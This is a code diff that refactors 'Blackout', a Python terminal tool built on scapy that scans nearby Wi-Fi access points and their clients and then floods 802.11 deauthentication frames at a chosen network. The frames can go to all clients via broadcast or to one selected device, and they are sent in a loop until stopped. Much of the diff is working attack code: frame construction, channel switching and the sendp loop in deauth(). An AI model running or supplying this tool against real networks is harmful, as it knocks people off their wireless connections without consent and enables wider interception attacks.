@@ -14,7 +14,7 @@ import logging
 # import argparse
 import traceback
 from time import sleep
-from utils import Utils
+from utils import *
 from triggerlist import TriggerList
 from subprocess import Popen, PIPE
 from threading import Thread, Lock, Event
@@ -41,7 +41,7 @@ class Blackout:
     def __init__(self, interface):
 
         # Set curses screen object
-        self.stdscr, self.window = self.start_curses()
+        self.screen, self.window = Blackout.start_curses()
 
         self.utils = Utils(interface)
 
@@ -64,9 +64,14 @@ class Blackout:
         self.target_id = None
 
         self.thread_channel_hop = Thread(
-            target=Blackout.channel_hop,
+            target=self.channel_hop,
             args=(str(interface),))
         self.thread_channel_hop.daemon = True
+
+        # Stop channel hopper when cleared
+        # Starts channel hopper when set
+        self.hop_channels = Event()
+        self.hop_channels.set()
 
         # Thread to listen for user input in curses
         self.input_thread = Thread(target=self.fetch_input)
@@ -109,20 +114,22 @@ class Blackout:
 
     def fetch_input(self):
         while True:
-            user_input = self.stdscr.getch()
+            user_input = self.screen.getch()
             user_input = chr(user_input)
 
             if user_input == 'q':
-                self.exit_application('thread')
+                self.exit_application(thread=True)
 
             if user_input == 's':
                 if self.deauth_active:
                     # Stop deauthentication
                     self.deauth_active = False
-                elif self.phase == 'AP' and self.ap_update_event.is_set():
+                elif self.ap_update_event.is_set():
                     self.ap_update_event.clear()
-                elif self.phase == 'client' and self.client_update_event.is_set():
-                    self.client_update_event.clear()
+                #elif self.client_update_event.is_set():
+                #    self.client_update_event.clear()
+                else:
+                    pass
 
             if user_input.isdigit():
                 if self.choosing:
@@ -168,8 +175,7 @@ class Blackout:
         """
         Start sniffing for access points and any connected clients
         """
-
-        event = self.ap_update_event if self.phase == 'AP' else self.client_update_event
+        #event = self.ap_update_event if self.phase == 'AP' else self.client_update_event
 
         self.output("[+] Sniffing Access Points on all channels\n")
         self.output("[+] Press 's' to select a target. 'q' to quit\n")
@@ -192,21 +198,22 @@ class Blackout:
 
         # Wait for user to end client sniffing phase
         # TODO: This seems very inelegant, fix this
-        while event.is_set(): pass
+        while self.ap_update_event.is_set():
+            pass
+
         sleep(2)
         self.show_summary()
 
-    def show_summary(self):
+    def show_summary(self, client=False):
         # Output a very simple summary of findings
-        self.main_display.append(self.utils.horizontal_rule(30))
-
-        if self.phase == 'AP':
-            self.main_display.append(f"Access Points discovered: {len(self.ap_dict)}\n\n")
-        elif self.phase == 'client':
-            self.main_display.append(f"Clients discovered: {len(self.ap_clients)}\n\n")
+        self.output(Utils.horizontal_rule(30))
+        if client:
+            self.output(f"Clients discovered: {len(self.ap_clients)}\n\n")
+        else:
+            self.output(f"Access Points discovered: {len(self.ap_dict)}\n\n")
 
     def deauth_menu_choice(self):
-        self.main_display.append(choice_string())
+        self.output(choice_string())
         self.choosing = True
         while self.choosing and self.choice is None:
             pass
@@ -214,63 +221,57 @@ class Blackout:
     def start_deauth(self):
         self.deauth_menu_choice()
 
-        # Deuth all clients from AP
+        # Deauth all clients from AP
         if self.choice == '1':
             self.choice = None
-            self.main_display.append("deauthing...")
-            self.deauth(
-                self.target_ap['bssid'],
-                str(self.target_ap['channel']),
-                BROADCAST_ADDR)
+            self.deauth()
 
         elif self.choice == '2':
             self.choice = None
             self.phase = 'client'
             self.start_sniff()
             self.select_target()
-            self.deauth(
-                self.target_ap['bssid'],
-                str(self.target_ap['channel']),
-                self.target_client)
+            self.deauth(deauth_all=False)
 
-    def select_target(self, phase='AP'):
+    def select_target(self, client=False):
         self.target_id = None
-        self.main_display.append(self.utils.horizontal_rule(30))
-        self.main_display.append(f"\n[?] Enter ID of the {self.phase} you wish to target: ")
+        self.output(Utils.horizontal_rule(30))
+        self.output(f"\n[?] Enter ID of the {'client' if client else 'AP'} you wish to target: ")
 
         # TODO: There may be a better way
+        # Waiting for user input
         while self.target_id is None:
             pass
 
-        self.main_display.append(str(self.target_id))
+        self.output(str(self.target_id))
 
-        if phase == 'AP':
-            #  FORMAT: ap_dict[count] = [bssid, ssid, channel, [clients, .. , ]]
-            self.target_ap = self.ap_dict[self.target_id]
+        if client:
+            self.target_client = self.ap_dict[self.target_ap]['clients'][self.target_id-1]
+        else:
+            self.target_ap = [ap for ap in self.ap_dict if self.ap_dict[ap]['ap_id'] == self.target_id]
+            self.display_ap_details()
 
-            outputs = [
-                self.utils.horizontal_rule(30),
-                f"\nSelected Access Point [{self.target_id}]\n",
-                f"\tssid:\t\t{self.target_ap['ssid']}\n",
-                f"\tbssid:\t\t{self.target_ap['bssid']}\n",
-                f"\tchannel:\t\t{self.target_ap['channel']}\n",
-                self.utils.horizontal_rule(30)]
+    def display_client_details(self):
+        self.output(Utils.horizontal_rule(30))
+        self.output(f"Targeting Client: [{self.target_client}]\n")
+        self.output(Utils.horizontal_rule(30))
 
-            for out in outputs: self.main_display.append(out)
+    def display_ap_details(self):
+        outputs = [
+            Utils.horizontal_rule(30),
+            f"\nSelected Access Point [{self.target_id}]\n",
+            f"\tssid:\t\t{self.target_ap['ssid']}\n",
+            f"\tbssid:\t\t{self.target_ap['bssid']}\n",
+            f"\tchannel:\t\t{self.target_ap['channel']}\n",
+            Utils.horizontal_rule(30)]
 
-        elif phase == 'client':
-            #  FORMAT: _ap_dict[count] = [bssid, ssid, channel, [clients, .. , ]]
-            # [{'1': [client info, ]}, {'2', [client info, ... ]}, ... ]
-            self.target_client = self.ap_clients[self.target_id - 1]
-
-            self.main_display.append(self.utils.horizontal_rule(30))
-            self.main_display.append(f"Targeting Client: [{self.target_client}]\n")
-            self.main_display.append(self.utils.horizontal_rule(30))
+        for line in outputs:
+            self.output(line)
 
     def run(self):
 
         # clear screen
-        self.stdscr.clear()
+        self.screen.clear()
         self.refresh_screen()
 
         try:
@@ -291,39 +292,53 @@ class Blackout:
             self.main_display.append("[!] Exiting...\n")
             sleep(2)
 
-    def deauth(self, bssid, channel, target):
+    def deauth(self, deauth_all=True):
         """
         create deauth packets and send them to the target AP
         """
 
+        bssid, channel = self.target_ap['bssid'], self.target_ap['channel']
+
         self.deauth_active = True
-        deauth_all = False
 
-        if target is BROADCAST_ADDR:
-            deauth_all = True
-            self.main_display.append(
-                f"\n[*] Deauthenticating ALL clients from {bssid} on channel {channel}...\n")
+        target_mac = None
+        if deauth_all:
+            self.output(f"\n[*] Deauthenticating ALL clients from {bssid} on channel {channel}...\n")
         else:
-            self.main_display.append(
-                f"[*] deauth {target} from {bssid} on channel {channel}...\n")
+            self.output(f"[*] Deauth {self.target_client} from {bssid} on channel {channel}...\n")
 
-        self.main_display.append("[*] Press 's' to stop.\n")
+        self.output("[*] Press 's' to stop. 'q' to quit.\n")
 
         try:
+            # Pause channel hopping
+            self.hop_channels.clear()
+            # Switch to target's channel
             go_to_chan = Popen(['iw', 'dev', 'wlan0', 'set', 'channel', channel], stdout=PIPE)
             go_to_chan.communicate()
 
             packets = []
-            dot11_to_ap = Dot11(
-                type=0, subtype=12, addr1=target, addr2=bssid, addr3=bssid) / Dot11Deauth()
-            dot11_to_client = Dot11(
-                type=0, subtype=12, addr1=bssid, addr2=target, addr3=target) / Dot11Deauth()
-            packets.append([dot11_to_ap, dot11_to_client])
 
             if deauth_all:
-                dot11_to_bcast = Dot11(
+                deauth_to_bcast = Dot11(
                     type=0, subtype=12, addr1=BROADCAST_ADDR, addr2=bssid, addr3=bssid) / Dot11Deauth()
-                packets.append(dot11_to_bcast)
+                packets.append(deauth_to_bcast)
+
+                with self.lock:
+                    for client in self.target_ap['clients']:
+                        deauth_to = Dot11(
+                        type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()
+
+                        deauth_from = Dot11(
+                        type=0, subtype=12, addr1=bssid, addr2=client, addr3=client) / Dot11Deauth()
+
+                        packets.extend([deauth_to, deauth_from])
+
+            else:
+                deauth_to_client = Dot11(
+                    type=0, subtype=12, addr1=self.target_client, addr2=bssid, addr3=bssid) / Dot11Deauth()
+                deauth_to_ap = Dot11(
+                    type=0, subtype=12, addr1=bssid, addr2=self.target_client, addr3=self.target_client) / Dot11Deauth()
+                packets.extend([deauth_to_ap, deauth_to_client])
 
             # create deauth packet for AP and add to list
             # deauth_pkt = dot11/Dot11Deauth() #RadioTap() / dot11 / Dot11Deauth(reason=7)
@@ -334,7 +349,7 @@ class Blackout:
             # for now I found this to be more reliable.
             try:
                 while self.deauth_active:
-                    self.main_display.append(".")
+                    self.output(".")
                     for pkt in packets:
                         sendp(pkt, inter=0.1, count=1, iface=conf.iface)
 
@@ -343,10 +358,10 @@ class Blackout:
 
             except Exception as e:
                 self.error(e)
-                self.exit_application('main')
+                self.exit_application()
                 sys.exit(0)
 
-            self.main_display.append("[*] Deauthentication Complete\n")
+            self.output("[*] Deauthentication Complete\n")
             return
 
         except Exception as e:
@@ -360,21 +375,18 @@ class Blackout:
         # Here scapy is going to check whether each sniffed packet
         # has particular 'layers' of encapsulation and act accordingly
 
-        if not self.ap_update_event.is_set():
-            return
-
-        if pkt.haslayer(Dot11):
-            # Check for beacon frames or probe responses from AP's
-            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
-
-                # If the packet contains a BSSID we have not encountered
-                if pkt.addr3.upper() not in self.ap_clients:
-                    access_point = pkt.addr3.upper()
-                    # Add Access-Point to ap_dict
-                    self.add_access_point(access_point, pkt)
+        if self.ap_update_event.is_set():
+            if pkt.haslayer(Dot11):
+                # Check for beacon frames or probe responses from AP's
+                if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
+                    # If the packet contains a BSSID we have not encountered
+                    if pkt.addr3.upper() not in self.ap_dict:
+                        access_point = pkt.addr3.upper()
+                        # Add Access-Point to ap_dict
+                        self.add_access_point(access_point, pkt)
 
     def sniff_clients(self, pkt):
-        try:
+        if self.client_update_event.is_set():
             if pkt.haslayer(Dot11) and pkt.getlayer(Dot11).type in (1, 2):
                 # Packet is a Data or Control Frame
                 if pkt.addr1 and pkt.addr2:
@@ -388,13 +400,6 @@ class Blackout:
                             self.add_client(src, dst)
                         elif dst in self.ap_dict and not self.is_client(dst, src):
                             self.add_client(dst, src)
-
-        except Exception as e:
-            Utils.log_error_to_file(traceback.format_exc())
-            self.error(e)
-
-        except KeyboardInterrupt:
-            pass
 
     def is_client(self, ap, client):
         return client in self.ap_dict[ap]['clients']
@@ -411,8 +416,9 @@ class Blackout:
             vendor = self.get_vendor(access_point)
             ap_id = len(self.ap_dict) + 1  # No. of AP's collected
 
-            self.ap_dict[access_point] = {
-                'id': ap_id, 'ssid': ssid, 'channel': channel, 'vendor': vendor, 'clients': []}
+            with self.lock:
+                self.ap_dict[access_point] = {
+                    'id': ap_id, 'ssid': ssid, 'channel': channel, 'vendor': vendor, 'clients': []}
 
             # Output the AP details
             description = f"\n{ap_id}\t%-20s\t%-20s\t{channel}\t\t%-20s\n" % (ssid, access_point, vendor)
@@ -426,7 +432,8 @@ class Blackout:
                 self.error(e)
 
     def add_client(self, access_point, new_client):
-        self.ap_dict[access_point]['clients'].append(new_client)
+        with self.lock:
+            self.ap_dict[access_point]['clients'].append(new_client)
 
     # def sniff_clients(self, pkt):
     #     """
@@ -474,14 +481,12 @@ class Blackout:
     def get_vendor(self, bssid):
         try:
             name = self.vendors[bssid[:8]]
+            return name
         except KeyError:
-            name = "unknown device"
-
-        return name
+            return "unknown device"
 
     # TODO move to utils
-    @staticmethod
-    def channel_hop(iface):
+    def channel_hop(self, iface):
         """
         Hop channels until interrupted
         """
@@ -490,34 +495,38 @@ class Blackout:
         limit = 14
 
         while True:
-            for i in range(1, 14):
-                channel = i % limit
-                # print(channel)
+            # Effectively pause channel hopping
+            if self.hop_channels.is_set():
+                for i in range(1, 14):
+                    channel = i % limit
+                    # print(channel)
 
-                # using Popen instead of os.system here avoids superfluous
-                # output to the terminal from the iw command
-                # which at times can crash the program (I'm not sure why yet)
-                # Note: I don't seem to need to PIPE any outputs(stdout etc.) for this to work
+                    # using Popen instead of os.system here avoids superfluous
+                    # output to the terminal from the iw command
+                    # which at times can crash the program (I'm not sure why yet)
+                    # Note: I don't seem to need to PIPE any outputs(stdout etc.) for this to work
 
-                # print("{} - {}".format(conf.iface, type(conf.iface)))
-                p = Popen(["iw", "dev", iface, "set", "channel", str(channel)])
-                try:
-                    # effectively execute p
-                    p.communicate()
-                    sleep(1)  # TODO -- Experiment with different values
-                except KeyboardInterrupt:
-                    break
-                except Exception:
-                    pass
+                    # print("{} - {}".format(conf.iface, type(conf.iface)))
+                    p = Popen(["iw", "dev", iface, "set", "channel", str(channel)])
+                    try:
+                        # if event is cleared, pause channel hopping
+                        if not self.hop_channels.is_set():
+                            break
+                        p.communicate()
+                        sleep(1)  # TODO -- Experiment with different values
+                    except KeyboardInterrupt:
+                        break
+                    except Exception:
+                        pass
 
     def exit_curses(self):
         # End curses
         curses.nocbreak()
-        self.stdscr.keypad(False)
+        self.screen.keypad(False)
         curses.echo()
         curses.endwin()
 
-    def exit_application(self, source='main'):
+    def exit_application(self, thread=False):
 
         self.to_window(f"[!!] Putting {self.iface} back into MANAGED mode...")
 
@@ -528,41 +537,14 @@ class Blackout:
 
             self.exit_curses()
 
-            if source == 'thread':
+            if thread:
                 os.kill(os.getpid(), signal.SIGINT)
                 sys.exit(0)
-
-            if source == 'main':
+            else:
                 sys.exit(0)
 
         except Exception as e:
             self.error(e)
-
-    def start_curses(self):
-        # Setup curses
-        stdscr = curses.initscr()
-        curses.noecho()
-        curses.cbreak()
-        curses.curs_set(0)
-        stdscr.keypad(True)
-
-        # Use all the colours!
-        # https://stackoverflow.com/questions/18551558/how-to-use-terminal-color-palette-with-curses
-        curses.start_color()
-        curses.use_default_colors()
-        for i in range(0, curses.COLORS):
-            curses.init_pair(i + 1, i, -1)
-
-        HEIGHT, WIDTH = stdscr.getmaxyx()
-
-        window = curses.newwin(HEIGHT - 2, WIDTH - 2, 1, 1)
-        # window.border('|', '|', '-', '-', '+', '+', '+', '+')
-
-        stdscr.noutrefresh()
-        window.noutrefresh()
-        curses.doupdate()
-
-        return stdscr, window
 
     def signal_handler(self, sig, stack_frame):
         """
@@ -579,6 +561,33 @@ class Blackout:
     def output(self, msg):
         self.main_display.append(msg)
 
+    @staticmethod
+    def start_curses():
+        # Setup curses
+        screen = curses.initscr()
+        curses.noecho()
+        curses.cbreak()
+        curses.curs_set(0)
+        screen.keypad(True)
+
+        # Use all the colours!
+        # https://stackoverflow.com/questions/18551558/how-to-use-terminal-color-palette-with-curses
+        curses.start_color()
+        curses.use_default_colors()
+        for i in range(0, curses.COLORS):
+            curses.init_pair(i + 1, i, -1)
+
+        HEIGHT, WIDTH = screen.getmaxyx()
+
+        window = curses.newwin(HEIGHT - 2, WIDTH - 2, 1, 1)
+        # window.border('|', '|', '-', '-', '+', '+', '+', '+')
+
+        screen.noutrefresh()
+        window.noutrefresh()
+        curses.doupdate()
+
+        return screen, window
+
 
 if __name__ == "__main__":
 
@@ -589,9 +598,7 @@ if __name__ == "__main__":
 
     try:
         blackout.run()
-
     except Exception as e:
         Utils.log_error_to_file(traceback.format_exc())
-
     except KeyboardInterrupt:
         pass
